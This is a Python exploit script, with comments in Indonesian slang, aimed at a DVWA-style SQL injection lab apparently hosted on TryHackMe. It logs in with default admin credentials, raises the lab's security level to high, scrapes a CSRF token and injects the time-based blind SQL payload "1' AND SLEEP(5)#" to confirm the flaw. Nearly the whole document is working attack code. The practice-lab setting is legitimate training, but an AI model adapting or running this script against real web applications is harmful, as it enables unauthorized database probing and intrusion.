import requests
import time
from bs4 import BeautifulSoup

# GANTI IP INI SAMA IP THM LU YANG AKTIF
TARGET_IP = "10.49.133.221"
BASE_URL = f"http://{TARGET_IP}"
LOGIN_URL = f"{BASE_URL}/login.php"
SECURITY_URL = f"{BASE_URL}/security.php"

# URL iframe dan Referer-nya
SQLI_BASE = f"{BASE_URL}/vulnerabilities/sqli/"
SOURCE_URL = f"{SQLI_BASE}source/high.php"

def run_exploit():
    session = requests.Session()
    
    # 1. LOGIN
    print("[*] Step 1: Logging in...")
    res = session.get(LOGIN_URL)
    soup = BeautifulSoup(res.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    token = token_input["value"] if token_input else ""
    
    login_data = {"username": "admin", "password": "password", "Login": "Login"}
    if token: login_data["user_token"] = token
    
    login_res = session.post(LOGIN_URL, data=login_data)
    if "Welcome" not in login_res.text and "logout" not in login_res.text.lower():
        print("[-] Login failed.")
        return
    print("[+] Login successful.")

    # 2. SET SECURITY LEVEL TO HIGH
    print("[*] Step 2: Setting security to HIGH...")
    res = session.get(SECURITY_URL)
    soup = BeautifulSoup(res.text, "html.parser")
    sec_token = soup.find("input", {"name": "user_token"})["value"]
    session.post(SECURITY_URL, data={"security": "high", "seclev_submit": "Submit", "user_token": sec_token})
    print("[+] Security set to High.")

    # 3. GET CSRF TOKEN DARI SOURCE/HIGH.PHP (BUKAN INDEX.PHP)
    print("[*] Step 3: Fetching CSRF token from source/high.php...")
    headers = {"Referer": SQLI_BASE}
    
    # HARUS pake GET dengan headers Referer
    res = session.get(SOURCE_URL, headers=headers)
    if len(res.text) == 0:
        print("[-] Gagal dapet HTML (Len: 0). Cek session/referer.")
        return

    soup = BeautifulSoup(res.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    if not token_input:
        print("[-] Gagal nemu CSRF token di source/high.php. HTML mungkin kosong.")
        return
        
    sqli_token = token_input["value"]
    print(f"[+] Token acquired: {sqli_token[:8]}...")

    # 4. POST PAYLOAD KE SOURCE/HIGH.PHP
    print("[*] Step 4: Injecting payload...")
    payload = "1' AND SLEEP(5)#"
    
    post_data = {
        "id": payload, 
        "Submit": "Submit", 
        "user_token": sqli_token
    }
    
    start_time = time.time()
    response = session.post(SOURCE_URL, data=post_data, headers=headers, timeout=15)
    elapsed = time.time() - start_time
    
    print(f"[*] Response time: {elapsed:.2f} seconds.")
    
    if elapsed >= 4.5:
        print("[+] VULNERABLE! Time-Based Blind SQLi CONFIRMED!")
    else:
        print("[-] Not vulnerable. Waktu respons terlalu cepat.")
        print(f"[-] Status Code: {response.status_code}")
        print(f"[-] Snippet: {response.text[:200]}")

if __name__ == "__main__":
    run_exploit()
